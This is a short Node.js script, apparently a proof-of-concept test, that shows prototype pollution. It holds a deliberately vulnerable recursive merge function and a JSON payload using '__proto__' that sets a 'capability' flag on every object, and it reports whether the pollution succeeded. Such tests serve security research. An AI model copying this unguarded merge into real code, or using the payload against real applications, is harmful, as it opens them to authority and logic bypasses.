#! /usr/bin/env node
"use strict";

function vulnerableMerge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value && typeof value === "object") {
      target[key] = target[key] || {};
      vulnerableMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}

const payload = JSON.parse('{"__proto__":{"canReachAmbientAuthority":true}}');
vulnerableMerge({}, payload);

const attackSucceeded = {}.canReachAmbientAuthority === true;
delete Object.prototype.canReachAmbientAuthority;

process.stdout.write(
  `${JSON.stringify({
    scenario: "prototype_pollution_capability_escape",
    attack_succeeded: attackSucceeded,
    polluted_property: "canReachAmbientAuthority",
  })}\n`,
);
process.exit(attackSucceeded ? 0 : 1);
